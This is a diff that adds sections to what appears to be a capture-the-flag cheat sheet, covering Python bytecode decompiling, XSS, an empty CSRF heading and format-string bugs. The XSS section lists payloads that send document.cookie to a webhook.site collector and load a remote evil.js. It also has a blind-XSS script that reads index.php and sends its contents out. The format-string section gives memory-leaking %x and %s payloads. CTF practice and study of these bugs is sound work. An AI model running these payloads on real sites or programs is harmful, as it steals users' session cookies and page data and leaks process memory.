@@ -335,6 +335,16 @@ https://gist.github.com/rkubik/b96c23bd8ed58333de37f2b8cd052c30
 http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf
 ```
 
+### Uncompyle6
+
+```bash
+# Install
+pip install uncompyle6
+
+# Command
+uncompyle6 untitled.pyc
+```
+
 # Web
 
 ### Practices
@@ -347,6 +357,36 @@ http://websec.fr/
 
 ```bash
 - Go to this website https://curl.trillworks.com/
+```
+
+### XSS
+
+```bash
+# Payload
+">'>< script>fetch("https://webhook.site/<ID>/?c="+document.cookie)< /script>
+">'>< script src="https://example.com/evil.js">< /script>
+
+#=====Script(1)======
+<script>
+var xml = new XMLHttpRequest()
+xml.open("GET","index.php",false)
+xml.send()
+fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText))
+//fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText).substr(0,1000))
+</script>
+=====================
+
+# Notes
+- https://webhook.site/ (Webhook)
+
+# References
+- https://github.com/W0rty/WU-CyberThreatForce/blob/main/README-EN.md (Blind XSS)
+```
+
+### CSRF
+
+```bash
+
 ```
 
 # Binary Exploitation
@@ -362,6 +402,28 @@ for i in {1..10};do python2 -c "print('\nadmin'+('\x00' * $i)+'admin')" | ./auth
 echo -e "\naaaaaaaaaaaaaaa" > input.txt
 ```
 
+### Format String
+
+```bash
+# Payload
+python3 -c "print('A' * 4 + '-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x')" | ./format
+python3 -c "print('AAAABBBB' + '-%x-%x-%x-%x-%x-%5$s-')" | ./format
+echo 'AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-' | ./format
+
+
+#Format String vulnerabilities.
+- Leaking secrets
+- Denial of Service
+- Leaking memory addresses
+- Overwriting memory addresses 
+
+# References
+- https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be
+- https://www.netsparker.com/blog/web-security/format-string-vulnerabilities/#:~:text=why%20they%20exist.-,Format%20strings%20are%20used%20in%20many%20programming%20languages%20to%20insert,information%20or%20execute%20arbitrary%20code
+- https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability
+- https://resources.infosecinstitute.com/topic/how-to-exploit-format-string-vulnerabilities/
+- https://owasp.org/www-community/attacks/Format_string_attack
+```
 # References
 - http://www.wechall.net/challs
 - https://ctftime.org/
